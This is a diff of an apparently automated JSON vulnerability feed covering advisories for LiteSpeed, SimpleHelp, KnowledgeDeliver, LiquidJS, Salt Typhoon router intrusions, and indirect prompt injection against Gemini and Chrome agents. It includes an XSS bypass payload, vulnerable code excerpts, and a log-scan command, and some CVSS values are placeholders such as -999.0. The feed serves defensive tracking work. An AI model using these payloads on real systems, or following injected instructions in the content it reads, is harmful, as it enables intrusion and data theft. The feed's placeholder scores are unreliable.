@@ -1,41 +1,10 @@
 {
-  "generated": "2026-05-26T19:54:39.813145+00:00",
-  "total": 20,
-  "kev": 1,
+  "generated": "2026-05-27T02:09:41.586653+00:00",
+  "total": 32,
+  "kev": 0,
   "zero_day": 14,
   "enriched": 10,
   "findings": [
-    {
-      "id": "CVE-2026-48172",
-      "title": "CVE-2026-48172 \u2014 LiteSpeed cPanel Plugin Privilege Escalation Vulnerability",
-      "summary": "Vendor: LiteSpeed | Product: cPanel Plugin. LiteSpeed cPanel Plugin contains privilege escalation vulnerability that is exposed via the user-end cPanel plugin, which can be abused by any cPanel user account to execute arbitrary scripts with root privileges. Required action: Apply mitigations per vendor instructions, follow applicable BOD 22-01 guidance for cloud services, or discontinue use of the product if mitigations are unavailable. (due 2026-05-29)",
-      "link": "https://nvd.nist.gov/vuln/detail/CVE-2026-48172",
-      "published": "2026-05-26",
-      "source": "CISA KEV",
-      "tags": [
-        "cisa",
-        "kev",
-        "actively-exploited"
-      ],
-      "cve_ids": [
-        "CVE-2026-48172"
-      ],
-      "is_kev": true,
-      "is_zero_day": true,
-      "is_high_severity": true,
-      "enrichment": {
-        "technical_details": "The vulnerability arises from improper validation of the `lsws.redisAble` (or `cpanel_jsonapi_func=redisAble`) function, which can be invoked by any cPanel user to execute arbitrary shell commands as the root user, leading to full privilege escalation.",
-        "affected_products": "LiteSpeed User-End cPanel Plugin versions 2.3 \u2013 2.4.4",
-        "cvss_score": "CVSS score unavailable.",
-        "cvss_vector": "CVSS vector unavailable.",
-        "exploit_available": "Exploit availability unknown.",
-        "patch_available": "true (https://blog.litespeedtech.com/2026/05/21/security-update-for-litespeed-cpanel-plugin/)",
-        "active_exploitation": "true",
-        "threat_actors": "None known",
-        "mitigation": "Upgrade the LiteSpeed User\u2011End cPanel Plugin to version 2.4.7 or later (bundled with WHM Plugin 5.3.1.0). If immediate patching is not possible, uninstall the user\u2011end plugin with `/usr/local/lsws/admin/misc/lscmctl cpanelplugin --uninstall`. Additionally, scan logs with `grep -rE \"cpanel_jsonapi_func=redisAble\" /var/cpanel/logs /usr/local/cpanel/logs/ 2>/dev/null` and block any suspicious IPs.",
-        "vendor_advisory": "https://blog.litespeedtech.com/2026/05/21/security-update-for-litespeed-cpanel-plugin/"
-      }
-    },
     {
       "id": "https://www.cisa.gov/news-events/cybersecurity-advisories/aa25-163a",
       "title": "Ransomware Actors Exploit Unpatched SimpleHelp Remote Monitoring and Management to Compromise Utility Billing Software Provider",
@@ -53,16 +22,43 @@
       "is_zero_day": true,
       "is_high_severity": true,
       "enrichment": {
-        "technical_details": "Path traversal vulnerabilities in SimpleHelp 5.5.7 and earlier allow unauthenticated remote attackers to retrieve logs, configuration files, and credentials, and potentially log in with high privileges.",
-        "affected_products": "SimpleHelp remote support / RMM versions 5.5.7 and earlier",
+        "technical_details": "Unauthenticated path traversal in SimpleHelp that lets remote attackers download arbitrary files by sending specially crafted HTTP requests.",
+        "affected_products": "SimpleHelp Remote Monitoring and Management versions 5.5.7 and earlier",
         "cvss_score": "7.5",
-        "cvss_vector": "CVSS vector unavailable",
-        "exploit_available": "true",
-        "patch_available": "true",
-        "active_exploitation": "true",
-        "threat_actors": "DragonForce",
-        "mitigation": "Apply vendor patch/update to SimpleHelp 5.5.8 immediately; if unable to patch, isolate SimpleHelp servers from public internet, restrict access via firewall/VPN, rotate credentials stored in SimpleHelp, and audit logs for suspicious access.",
-        "vendor_advisory": "https://community.simple-help.com/t/simplehelp-5-5-8-critical-security-fixes/1570"
+        "cvss_vector": "CVSS vector unavailable.",
+        "exploit_available": "Public proof-of-concept/weaponized exploit reported (see SecurityWeek).",
+        "patch_available": "Patches released in SimpleHelp versions 5.5.8, 5.4.10, and 5.3.9",
+        "active_exploitation": "Confirmed active exploitation reported by CISA (AA25-163A) and FortiGuard.",
+        "threat_actors": "DragonForce ransomware group and other ransomware operators",
+        "mitigation": "Upgrade to the patched SimpleHelp versions; if patching is not possible, isolate or block internet\u2011exposed SimpleHelp servers, conduct threat hunting, and monitor network traffic per CISA guidance.",
+        "vendor_advisory": "https://simple-help.com/kb---security-vulnerabilities-01-2025"
+      }
+    },
+    {
+      "id": "https://www.bleepingcomputer.com/news/security/knowledgedeliver-flaw-exploited-as-a-zero-day-to-install-web-shells/",
+      "title": "KnowledgeDeliver flaw exploited as a zero-day to install web shells",
+      "summary": "Hackers exploited a critical zero-day vulnerability in a server running the KnowledgeDeliver learning management system (LMS) to deploy the Godzilla web shell. [...]",
+      "link": "https://www.bleepingcomputer.com/news/security/knowledgedeliver-flaw-exploited-as-a-zero-day-to-install-web-shells/",
+      "published": "2026-05-26T20:07:31+00:00",
+      "source": "Bleeping Computer",
+      "tags": [
+        "news",
+        "malware"
+      ],
+      "cve_ids": [],
+      "is_zero_day": true,
+      "is_high_severity": true,
+      "enrichment": {
+        "technical_details": "The vulnerability arises from hard\u2011coded identical ASP.NET machineKey values in KnowledgeDeliver\u2019s web.config. Attackers can craft signed ViewState payloads that the server accepts and deserializes, achieving unauthenticated remote code execution and in\u2011memory deployment of the BLUEBEAM/Godzilla web shell.",
+        "affected_products": "Digital Knowledge KnowledgeDeliver (versions released before February 24, 2026)",
+        "cvss_score": "7.5",
+        "cvss_vector": "CVSS vector unavailable.",
+        "exploit_available": "No public proof-of-concept is available.",
+        "patch_available": "Patch available: Vendor released fixes after Feb\u202f24\u202f2026 \u2014 update KnowledgeDeliver to versions released after Feb\u202f24\u202f2026.",
+        "active_exploitation": "Yes \u2014 confirmed active exploitation in the wild, reported by Mandiant, Google Cloud Threat Intelligence, BleepingComputer, and SecurityWeek.",
+        "threat_actors": "Unknown specific group; an unknown threat actor observed by Mandiant deployed the BLUEBEAM/Godzilla web shell.",
+        "mitigation": "Rotate and generate unique, cryptographically strong ASP.NET machineKey values in web.config for each deployment; update KnowledgeDeliver to versions released after Feb\u202f24\u202f2026; restrict LMS access to trusted IP ranges; implement WAF rules to block suspicious __VIEWSTATE payloads; disable ViewState if possible; monitor for indicators such as large/malformed __VIEWSTATE, IIS deserialization errors, w3wp.exe spawning, and web\u2011shell artifacts.",
+        "vendor_advisory": "Vendor advisory URL unavailable."
       }
     },
     {
@@ -80,15 +76,15 @@
       "is_zero_day": true,
       "is_high_severity": true,
       "enrichment": {
-        "technical_details": "Hardcoded identical ASP.NET machineKey values in KnowledgeDeliver web.config allowed attackers who obtained the key to craft malicious ViewState (__VIEWSTATE) payloads that deserialize on the server, enabling unauthenticated remote code execution and in\u2011memory web shell deployment.",
-        "affected_products": "KnowledgeDeliver (all deployments before 2026-02-24)",
+        "technical_details": "Hard\u2011coded ASP.NET machineKey values allow attackers to craft a malicious ViewState payload that bypasses validation and deserializes arbitrary objects, resulting in remote code execution.",
+        "affected_products": "Digital Knowledge KnowledgeDeliver (all deployments prior to February 24, 2026)",
         "cvss_score": "7.5",
-        "cvss_vector": "CVSS vector unavailable.",
-        "exploit_available": "true",
-        "patch_available": "false",
-        "active_exploitation": "true",
-        "threat_actors": "None known",
-        "mitigation": "Rotate machineKey for each instance, restrict LMS access to known IP ranges, monitor IIS and application logs, hunt for indicators (Event ID 1316, suspicious w3wp.exe activity, file tampering, anomalous User-Agent strings).",
+        "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N",
+        "exploit_available": "No public proof-of-concept available; exploitation observed in the wild.",
+        "patch_available": "Vendor released patches for Digital Knowledge KnowledgeDeliver in versions released after February 24, 2026.",
+        "active_exploitation": "Confirmed active exploitation reported by Mandiant, with attackers deploying Godzilla web shells and Cobalt Strike backdoors.",
+        "threat_actors": "Mandiant reported attackers deploying Godzilla web shells and Cobalt Strike; no specific APT identified.",
+        "mitigation": "Update KnowledgeDeliver to versions released after February 24, 2026; audit and replace hard\u2011coded machineKey values with unique cryptographically strong keys; restrict access to the application; implement WAF rules to block malicious ViewState payloads; monitor for large or malformed __VIEWSTATE parameters and web\u2011shell indicators.",
         "vendor_advisory": "Vendor advisory URL unavailable."
       }
     },
@@ -107,15 +103,15 @@
       "is_zero_day": true,
       "is_high_severity": true,
       "enrichment": {
-        "technical_details": "The campaign uses SEO\u2011poisoned search results to lure victims to a fake Oracle SQL Developer download page. The installer drops the MiniFast backdoor, which communicates over HTTP for tasking, file exfiltration, and additional payload download. MiniFast supports file operations, process enumeration, command execution via cmd.exe, DLL loading, ZIP creation, scheduled\u2011task persistence, and privilege escalation via runas. MiniJunk V2 is used for initial payload delivery through AppDomain hijacking.",
-        "affected_products": "Oracle SQL Developer",
-        "cvss_score": "CVSS score unavailable.",
+        "technical_details": "The actor used SEO\u2011poisoned search results and spear\u2011phishing lures impersonating aviation and software vendors to deliver installers/attachments that deploy MiniFast (an AI\u2011assisted backdoor) and MiniJunk V2. Delivery included malicious installers and hosting via cloud services (e.g., Microsoft Azure) and side\u2011loading/injection techniques to run within legitimate process contexts.",
+        "affected_products": "Affected products unavailable.",
+        "cvss_score": "0.0",
         "cvss_vector": "CVSS vector unavailable.",
-        "exploit_available": "true",
-        "patch_available": "Patch availability unknown.",
-        "active_exploitation": "true",
-        "threat_actors": "Nimbus Manticore (also known as Screening Serpens and UNC1549)",
-        "mitigation": "Validate software downloads by using official vendor sites; block or monitor traffic to known malicious domains; employ endpoint detection and response solutions; disable execution of unsigned installers; regularly audit scheduled tasks and running processes for suspicious activity.",
+        "exploit_available": "No public PoC or weaponized exploit reported.",
+        "patch_available": "Patch unavailable.",
+        "active_exploitation": "Confirmed active exploitation reported by The Hacker News and Check Point Research (campaigns in May 2026 using MiniFast and MiniJunk V2 via phishing and SEO poisoning).",
+        "threat_actors": "Nimbus Manticore (aka Screening Serpens, UNC1549)",
+        "mitigation": "Harden email defenses and user awareness; block known malicious domains and SEO-poisoned URLs; deploy/ensure EDR and up\u2011to\u2011date AV with behavioral detection; restrict execution from user download folders; apply least\u2011privilege and MFA for accounts; monitor for indicators of compromise reported by vendors/researchers.",
         "vendor_advisory": "Vendor advisory URL unavailable."
       }
     },
@@ -135,16 +131,16 @@
       "is_zero_day": true,
       "is_high_severity": true,
       "enrichment": {
-        "technical_details": "Indirect Prompt Injection (IPI) is an attack where adversaries place maliciously crafted content on web pages or other data sources that AI agents consume, causing the agent to follow attacker\u2011controlled instructions or disclose sensitive data. The attack chain requires injecting adversarial prompts into contexts consumed by models (e.g., web text, code contexts).",
+        "technical_details": "Indirect Prompt Injection (IPI) occurs when an AI system processes untrusted content\u2014such as a website, email, or document\u2014that contains malicious instructions, allowing attackers to embed prompts that the model may execute.",
         "affected_products": "Affected products unavailable.",
-        "cvss_score": "CVSS score unavailable.",
+        "cvss_score": "0.0",
         "cvss_vector": "CVSS vector unavailable.",
-        "exploit_available": "false",
-        "patch_available": "false",
-        "active_exploitation": "true",
+        "exploit_available": "No public proof\u2011of\u2011concept or weaponized exploit is currently available.",
+        "patch_available": "No official vendor \"patch\" for IPI; see Google Security Blog for mitigation information.",
+        "active_exploitation": "Limited malicious instances observed; no evidence of large\u2011scale, sophisticated active exploitation.",
         "threat_actors": "None known",
-        "mitigation": "Hardening includes continuous monitoring for IPI payloads, input sanitization/validation, context filtering, content provenance and sourcing controls, model instruction\u2011following constraints, and vendor mitigations described by Google; refer to the vendor advisory for details.",
-        "vendor_advisory": "http://security.googleblog.com/2026/04/ai-threats-in-wild-current-state-of.html"
+        "mitigation": "Apply layered defenses: model hardening, red\u2011team testing, AI Vulnerability Reward Program, content sanitization, prompt validation, and rate/timeout controls.",
+        "vendor_advisory": "Vendor advisory URL unavailable."
       }
     },
     {
@@ -163,16 +159,16 @@
       "is_zero_day": true,
       "is_high_severity": true,
       "enrichment": {
-        "technical_details": "Indirect prompt injection (IPI) is a class of attacks where adversaries embed malicious instructions in data or tools consumed indirectly by an LLM (e.g., content in Workspace apps or web data), causing the model or agentic workflows to follow those instructions. Attack surface includes multi-source data, tool chaining, and agent automation.",
-        "affected_products": "Google Workspace with Gemini (e.g., Gmail, Docs); specific versions unavailable",
-        "cvss_score": "CVSS score unavailable",
-        "cvss_vector": "CVSS vector unavailable",
-        "exploit_available": "Exploit availability unknown",
-        "patch_available": "false",
-        "active_exploitation": "Active exploitation status unknown",
+        "technical_details": "Indirect prompt injection (IPI) involves attackers injecting malicious instructions into data or tools consumed by LLMs, influencing model behavior without direct user input. The vulnerability arises from complex AI applications that integrate multiple data sources, such as Google Workspace with Gemini, allowing crafted content or tool outputs to steer the model.",
+        "affected_products": "Google Workspace features integrating Gemini (e.g., Gmail, Docs).",
+        "cvss_score": "0.0",
+        "cvss_vector": "CVSS vector unavailable.",
+        "exploit_available": "No public proof\u2011of\u2011concept or weaponized exploit is linked in the advisory.",
+        "patch_available": "No single patch available; defenses are described in the advisory.",
+        "active_exploitation": "No confirmed public reports of active exploitation are mentioned in the advisory.",
         "threat_actors": "None known",
-        "mitigation": "Defense-in-depth continuous approach: human and automated red\u2011teaming; Google AI VRP; vulnerability cataloging and synthetic data generation; deterministic defenses (user confirmation, URL sanitization, tool\u2011chaining policies governed by a centralized Policy Engine); ML\u2011based defenses retrained on synthetic variants; LLM model hardening to ignore embedded harmful instructions; monitoring of public disclosures and rapid config \"point fixes\" (e.g., regex takedowns).",
-        "vendor_advisory": "http://security.googleblog.com/2026/04/google-workspaces-continuous-approach.html"
+        "mitigation": "Google recommends layered defenses: deterministic defenses (user confirmation, URL sanitization, tool\u2011chaining policies, centralized policy engine, quick config point\u2011fixes), ML\u2011based defenses (retraining on synthetic attack variants), LLM\u2011based defenses (prompt engineering), and Gemini model hardening, supplemented by continuous red\u2011teaming and VRP engagement.",
+        "vendor_advisory": "https://blog.google/security/google-workspaces-continuous-approach-to-mitigating-indirect-prompt-injections/"
       }
     },
     {
@@ -191,16 +187,16 @@
       "is_zero_day": true,
       "is_high_severity": true,
       "enrichment": {
-        "technical_details": "Indirect prompt injection occurs when untrusted web content (malicious pages, iframes, user\u2011generated content) crafts inputs that influence an agent/planner model to perform unwanted actions (e.g., financial transactions, data exfiltration). Chrome limits model exposure via origin gating, uses an isolated alignment critic to vet actions, runs a parallel prompt\u2011injection classifier, and requires user confirmations for impactful actions.",
-        "affected_products": "Affected products unavailable.",
-        "cvss_score": "CVSS score unavailable.",
+        "technical_details": "Indirect prompt injection (IPI) allows malicious content on web pages or third\u2011party resources to manipulate the instructions or context of an AI agent in Chrome\u2019s agentic browsing, causing the agent to perform unintended or unsafe actions.",
+        "affected_products": "Google Chrome (agentic browsing / Gemini\u2011in\u2011Chrome features) \u2014 versions with agentic capabilities rolled out starting Dec 2025.",
+        "cvss_score": "0.0",
         "cvss_vector": "CVSS vector unavailable.",
-        "exploit_available": "false",
-        "patch_available": "true \u2014 https://blog.google/security/architecting-security-for-agentic/",
-        "active_exploitation": "false",
-        "threat_actors": "None known.",
-        "mitigation": "Layered defenses described by Google: User Alignment Critic (isolated vetting model), Origin Sets (readable vs read\u2011writeable origin gating), deterministic checks on model\u2011generated URLs, user confirmations for sensitive actions, prompt\u2011injection classifier running in parallel, Safe Browsing integration, red\u2011teaming and VRP updates.",
-        "vendor_advisory": "https://blog.google/security/architecting-security-for-agentic/"
+        "exploit_available": "No public PoC or weaponized exploit reported.",
+        "patch_available": "Apply the latest Chrome updates that include the layered security features for agentic browsing.",
+        "active_exploitation": "Google observed an increase in indirect prompt injection attempts on public sites but did not report confirmed widespread active exploitation; researchers/Google flagged rising attempts.",
+        "threat_actors": "None known",
+        "mitigation": "Apply the latest Chrome updates; enable Chrome\u2019s agentic\u2011safety features and layered defenses as described by Google; follow the guidance in the advisory.",
+        "vendor_advisory": "http://security.googleblog.com/2025/12/architecting-security-for-agentic.html"
       }
     },
     {
@@ -219,16 +215,16 @@
       "is_zero_day": true,
       "is_high_severity": true,
       "enrichment": {
-        "technical_details": "Race condition in the Rust implementation of the Android Binder IPC subsystem caused by an unsafe block that corrupts the prev and next pointers of a linked list, potentially leading to kernel panic or system crash (DoS).",
-        "affected_products": "Linux kernel 6.18 and later with CONFIG_ANDROID_BINDER_IPC_RUST=y; some Android kernels with 6.12.x backports",
-        "cvss_score": "4.6",
-        "cvss_vector": "CVSS vector unavailable.",
-        "exploit_available": "false",
-        "patch_available": "true",
-        "active_exploitation": "false",
+        "technical_details": "Google reports that shifting new Android code toward Rust and focusing on memory\u2011safety in new code reduced memory\u2011safety vulnerability density substantially in 2025, with memory\u2011safety vulnerabilities falling below 20% of total vulnerabilities; covers changes across C/C++ and Rust adoption.",
+        "affected_products": "Android platform (first-party and third-party open-source components written in C, C++, Java, Kotlin and Rust)",
+        "cvss_score": "-999.0",
+        "cvss_vector": "CVSS vector unavailable",
+        "exploit_available": "None known",
+        "patch_available": "Official vendor advisory describes adoption of Rust and platform changes; no single patch or CVE-specific fix URL provided in advisory",
+        "active_exploitation": "No confirmed active exploitation reported in the advisory",
         "threat_actors": "None known",
-        "mitigation": "Apply the official kernel patches; restrict local access to the Binder driver; monitor system logs for rust_binder crashes; review and disable the CONFIG_ANDROID_BINDER_IPC_RUST kernel configuration if not required.",
-        "vendor_advisory": "https://ubuntu.com/security/CVE-2025-68260"
+        "mitigation": "Continue migrating new code to memory-safe languages (Rust), apply standard Android security updates, follow vendor guidance in advisory",
+        "vendor_advisory": "http://security.googleblog.com/2025/11/rust-in-android-move-fast-fix-things.html"
       }
     },
     {
@@ -247,15 +243,15 @@
       "is_zero_day": true,
       "is_high_severity": true,
       "enrichment": {
-        "technical_details": "Indirect prompt injection occurs when hidden malicious instructions in external data sources (emails, documents, calendar invites, or embedded URLs/images) cause a generative\u2011AI assistant to perform unintended actions or exfiltrate data. The attack leverages the model\u2019s ability to follow natural\u2011language instructions embedded in content it processes, allowing an adversary to trigger malicious behavior without directly interacting with the model.",
-        "affected_products": "Gemini 2.5, Gemini (Google Workspace)",
-        "cvss_score": "CVSS score unavailable",
-        "cvss_vector": "CVSS vector unavailable",
-        "exploit_available": "false",
-        "patch_available": "false",
-        "active_exploitation": "false",
-        "threat_actors": "None known",
-        "mitigation": "Use layered defenses \u2014 model hardening/adversarial training, content classifiers, markdown sanitization (no external image rendering), suspicious URL detection/redaction (Safe Browsing), contextual user confirmation for risky actions, end\u2011user security notifications, and follow Google help center guidance. Monitor vendor advisories and apply recommended configuration changes.",
+        "technical_details": "Indirect prompt injection embeds malicious instructions inside external data sources (web pages, documents, emails, calendar invites). When an LLM ingests that data (via browsing, document parsing, or context assembly), the hidden instructions can influence model outputs to exfiltrate secrets or perform unauthorized actions.",
+        "affected_products": "Affected products unavailable.",
+        "cvss_score": "0.0",
+        "cvss_vector": "CVSS vector unavailable.",
+        "exploit_available": "No public PoC or weaponized exploit known.",
+        "patch_available": "No vendor patch; guidance/advisory published at the URL above.",
+        "active_exploitation": "Confirmed increase in indirect prompt injection attempts in the wild per Google analysis and independent research (reports from Google, X\u2011Labs, Forcepoint and others).",
+        "threat_actors": "None known.",
+        "mitigation": "Layered defenses \u2014 input sanitization and provenance checks, restrict or disable autonomous browsing of untrusted external content, prompt allowlisting and hardening, require user confirmation before sensitive actions, least\u2011privilege access for models, telemetry and monitoring for anomalous model behavior.",
         "vendor_advisory": "http://security.googleblog.com/2025/06/mitigating-prompt-injection-attacks.html"
       }
     },
@@ -274,16 +270,16 @@
       "is_zero_day": true,
       "is_high_severity": false,
       "enrichment": {
-        "technical_details": "PRC state-sponsored APTs compromise internet-exposed network-edge devices (routers, provider edge/customer edge) by exploiting publicly known CVEs and weak/default credentials, gaining administrative access to modify configurations (ACLs, routes, open ports), enable traffic mirroring or tunneling, run virtual containers or scripts on-device for persistence and lateral movement, and exfiltrate or redirect traffic.",
-        "affected_products": "Cisco IOS XE, Cisco IOS, Ivanti Connect Secure, Ivanti Policy, Fortinet firewalls, Juniper firewalls, Nokia routers and switches, Sierra Wireless devices, SonicWall firewalls",
-        "cvss_score": "CVSS score unavailable",
-        "cvss_vector": "CVSS vector unavailable",
-        "exploit_available": "Exploit availability unknown",
-        "patch_available": "Patch availability unknown",
-        "active_exploitation": "true",
-        "threat_actors": "Salt Typhoon, OPERATOR PANDA, RedMike, UNC5807, GhostEmperor",
-        "mitigation": "Prioritize patching known exploited CVEs; monitor router configs/logs for unexpected ACLs, GRE/IPsec tunnels, SPAN/RSPAN/ERSPAN, unexpected virtual containers; disable unused services/protocols; change default credentials; enforce PKI/public-key auth for admin access; perform firmware image/hash integrity checks and inventory; apply Cisco-specific Guest Shell hardening as recommended",
-        "vendor_advisory": "Vendor advisory URL unavailable."
+        "technical_details": "Actors exploit known CVEs and misconfigurations to gain initial access to edge/backbone routers, then modify router configurations and firmware, create accounts, alter AAA/TACACS+ settings, enable packet capture (Embedded Packet Capture/PCAP), create SPAN/RSPAN/ERSPAN sessions, change ACLs, open ports, execute Tcl scripts, use SNMP and SSH for command execution, and mirror/capture traffic to collect credentials and pivot to other networks.",
+        "affected_products": "Cisco IOS and IOS XE devices (including routers), broadly: backbone routers, PE and CE routers; advisory notes potential targeting of Fortinet firewalls, Juniper firewalls, Microsoft Exchange, Nokia routers/switches, Sierra Wireless devices, SonicWall (Exact versions not enumerated) \u2014 Affected products unavailable for specific versions.",
+        "cvss_score": "0.0",
+        "cvss_vector": "CVSS vector unavailable.",
+        "exploit_available": "No zero-day exploitation observed; actors exploit publicly known CVEs (examples cited by industry: CVE-2023-20198, CVE-2018-0171, CVE-2023-20273, CVE-2024-21887, CVE-2024-3400). No public PoC/weaponized exploit URL specified in the advisory.",
+        "patch_available": "Vendors (e.g., Cisco, Ivanti, Palo Alto) have released patches for specific CVEs referenced; advisory links to vendor hardening resources but does not list a single vendor patch URL. Patch/advisory URLs: CISA advisory (above) links to Cisco resources: Cisco Software Checker and hardening guides.",
+        "active_exploitation": "Yes \u2014 confirmed active exploitation in the wild of routers and infrastructure via publicly known CVEs and configuration weaknesses; advisory and allied reporting describe persistent, long-term operations and exploitation of known CVEs. Sources: CISA advisory, SecurityWeek, Canadian Centre for Cyber Security.",
+        "threat_actors": "Salt Typhoon; OPERATOR PANDA; RedMike; UNC5807; GhostEmperor",
+        "mitigation": "Prioritize patching known exploited CVEs; disable unused ports/protocols; use encrypted/authenticated management protocols (SSH/SFTP/HTTPS); change default credentials; require public-key authentication for admin roles; perform firmware/software integrity/hash verification; monitor logs and configurations; validate runtime image integrity; follow vendor hardening guides (Cisco IOS/IOS XE hardening); enforce network segmentation and disable unneeded services.",
+        "vendor_advisory": "https://www.cisa.gov/news-events/cybersecurity-advisories/aa25-239a"
       }
     },
     {
@@ -352,21 +348,238 @@
       "is_high_severity": false
     },
     {
-      "id": "https://seclists.org/fulldisclosure/2026/May/20",
-      "title": "[SECURITY ADVISORY] CVE-2026-34474 - ZTE H298A/H108N Unauthenticated Admin Credential Exposure",
-      "summary": "Posted by m.nageh on May 25 -----BEGIN SECURITY ADVISORY----- Advisory ID: MONX-2026-003 CVE ID: CVE-2026-34474 Title: ZTE ZXHN H298A / H108N - Unauthenticated Admin Password & WLAN Credential Exposure Affected: ZTE ZXHN H298A 1.1, ZTE ZXHN H108N 2.6 (EOL; no patch planned) Date: 2026-05-20 Author: Mina Nageh Salalma (Monx Research) Contact: minanageh379 () gmail com Public URL:...",
-      "link": "https://seclists.org/fulldisclosure/2026/May/20",
-      "published": "2026-05-26T01:43:41+00:00",
-      "source": "Full Disclosure",
+      "id": "CVE-2026-44979",
+      "title": "@hapi/wreck leaks sensitive `Proxy-Authorization` header across cross-hostname redirects",
+      "summary": "### Impact\nWhen `@hapi/wreck` follows a 3xx redirect to a different hostname, only the `Authorization` and `Cookie` headers are stripped. The standard credential header `Proxy-Authorization` is forwarded intact to the redirect target, potentially exposing forward-proxy credentials to a host outside the original trust boundary.\n\nRedirect following is opt-in. The redirects option defaults to false (no redirections followed), so applications are only affected if they have explicitly set redirects to a positive integer on the request or via `Wreck.defaults({ redirects: ... })`.\n\n### Patches\n`@hapi/wreck` 18.1.1 extends the cross-hostname strip set to include `proxy-authorization`. Upgrade to 18.1.1 or later.\n\n### Workarounds\nIf upgrading is not immediately possible:\n- Leave redirects at its default (`false`) \u2014 applications that never enable redirect following are not affected.\n- If redirects are required, set redirects: 0 when calling endpoints with sensitive headers, or strip Proxy-Authorization from the headers before issuing the request.\n- Use the `beforeRedirect` hook to manually strip proxy-authorization (and any other sensitive application headers) when `redirectOptions` targets a different hostname than the original request.\n\n### Resources\n- Related: [CVE-2024-30260 / GHSA-3787-6prv-h9w3 ](https://github.com/nodejs/undici/security/advisories/GHSA-3787-6prv-h9w3)(undici)\n- [RFC 7235 \u00a74.4 \u2014 Proxy-Authorization](https://datatracker.ietf.org/doc/html/rfc7235#section-4.4)",
+      "link": "https://github.com/advisories/GHSA-vhjm-w67q-g75c",
+      "published": "2026-05-27T00:38:09Z",
+      "source": "GitHub Security Advisories",
       "tags": [
-        "disclosure",
-        "exploit"
+        "github",
+        "advisories",
+        "oss"
       ],
       "cve_ids": [
-        "CVE-2026-34474"
+        "CVE-2026-44979"
       ],
-      "is_zero_day": true,
-      "is_high_severity": false
+      "is_zero_day": false,
+      "is_high_severity": true
+    },
+    {
+      "id": "CVE-2026-44646",
+      "title": "LiquidJS's `{% render %}` tag silently bypasses per-render `ownPropertyOnly:true` via `Context.spawn()`",
+      "summary": "## Summary\n\n`Context.spawn()` in liquidjs creates a child `Context` for the `{% render %}` tag but does not propagate the parent context's resolved `ownPropertyOnly` value. The new context re-derives `ownPropertyOnly` from `opts.ownPropertyOnly` (the instance-level option), silently discarding any `RenderOptions.ownPropertyOnly` override that was supplied to `parseAndRender()`. As a result, a developer who runs a Liquid instance with the backwards-compatible `ownPropertyOnly:false` and then locks down an untrusted render with `parseAndRender(..., { ownPropertyOnly: true })` still leaks prototype-chain properties from inside any `{% render %}` partial. This is a distinct exploit surface from the previously identified array-filter variants (`where`, `reject`, `group_by`, `find`, `find_index`, `has`) \u2014 the underlying root cause in `Context.spawn()` is shared, but `{% render %}` is a separately reachable sink that needs no filter usage.\n\n## Details\n\nThe bug is in `Context.spawn()`:\n\n```ts\n// src/context/context.ts:105-114\npublic spawn (scope = {}) {\n  return new Context(scope, this.opts, {\n    sync: this.sync,\n    globals: this.globals,\n    strictVariables: this.strictVariables\n    // <-- ownPropertyOnly is missing here\n  }, {\n    renderLimit: this.renderLimit,\n    memoryLimit: this.memoryLimit\n  })\n}\n```\n\nThe constructor resolves `ownPropertyOnly` as:\n\n```ts\n// src/context/context.ts:47\nthis.ownPropertyOnly = renderOptions.ownPropertyOnly ?? opts.ownPropertyOnly\n```\n\nBecause `spawn()` passes a `RenderOptions` object with no `ownPropertyOnly`, the child context falls back to `opts.ownPropertyOnly` (the instance-level option), throwing away any per-render override that the parent context had applied. `this.opts` is the raw normalized instance options object; it is not mutated to reflect render-time overrides.\n\nThe `{% render %}` tag at `src/tags/render.ts:51-77` calls `spawn()` to build the partial's isolated scope:\n\n```ts\n* render (ctx: Context, emitter: Emitter): Gener",
+      "link": "https://github.com/advisories/GHSA-9x9p-qf8f-mvjg",
+      "published": "2026-05-27T00:28:06Z",
+      "source": "GitHub Security Advisories",
+      "tags": [
+        "github",
+        "advisories",
+        "oss"
+      ],
+      "cve_ids": [
+        "CVE-2026-44646"
+      ],
+      "is_zero_day": false,
+      "is_high_severity": true
+    },
+    {
+      "id": "CVE-2026-44644",
+      "title": "LiquidJS's strip_html filter bypass via newline characters in HTML tags enables XSS",
+      "summary": "## Summary\n\nThe `strip_html` filter in liquidjs is intended to remove HTML tags from a string before rendering, and is widely used as an XSS sanitizer. The implementation uses a regex whose catch-all branch (`<.*?>`) does not match line terminators, so any HTML tag containing a `\\n` or `\\r` character passes through unmodified. An attacker who can place a newline inside a tag (e.g. `<img\\nsrc=x\\nonerror=alert(1)>`) bypasses sanitization entirely, since browsers treat newlines as whitespace within a tag and execute the resulting `onerror`/`onload`/etc. handler. This results in stored or reflected XSS in any application that relies on `strip_html` to neutralize untrusted HTML.\n\n## Details\n\nThe vulnerable code is in `src/filters/html.ts`:\n\n```ts\n// src/filters/html.ts:45-49\nexport function strip_html (this: FilterImpl, v: string) {\n  const str = stringify(v)\n  this.context.memoryLimit.use(str.length)\n  return str.replace(/<script[\\s\\S]*?<\\/script>|<style[\\s\\S]*?<\\/style>|<.*?>|<!--[\\s\\S]*?-->/g, '')\n}\n```\n\nThe regex has four alternations:\n1. `<script[\\s\\S]*?<\\/script>` \u2014 uses `[\\s\\S]`, matches across newlines.\n2. `<style[\\s\\S]*?<\\/style>` \u2014 uses `[\\s\\S]`, matches across newlines.\n3. `<.*?>` \u2014 uses `.`, which in JavaScript does **not** match `\\n` or `\\r` (no `s`/dotAll flag set).\n4. `<!--[\\s\\S]*?-->` \u2014 uses `[\\s\\S]`, matches across newlines.\n\nBranch 3 is the catch-all for \"any other tag.\" Because `.` excludes line terminators, a tag containing a newline does not match any alternative. The literal characters of the tag are passed through to the output.\n\nBrowsers, however, parse HTML tag content with whitespace tolerance: per the HTML spec, attribute names and values may be separated by ASCII whitespace, which includes `\\n` and `\\r`. So `<img\\nsrc=x\\nonerror=alert(1)>` is parsed as a valid `img` element with an `onerror` handler.\n\n`liquidjs`' default rendering pipeline does not auto-escape filter output (the `outputEscape` engine option is undefined by default \u2014 see `src/l",
+      "link": "https://github.com/advisories/GHSA-2qv6-9wx5-cwv4",
+      "published": "2026-05-27T00:09:12Z",
+      "source": "GitHub Security Advisories",
+      "tags": [
+        "github",
+        "advisories",
+        "oss"
+      ],
+      "cve_ids": [
+        "CVE-2026-44644"
+      ],
+      "is_zero_day": false,
+      "is_high_severity": true
+    },
+    {
+      "id": "CVE-2026-44632",
+      "title": "Yamcs Vulnerable to Server-Side Code Injection (RCE) via Janino Expression Engine in `JavaExprAlgorithmExecutionFactory`",
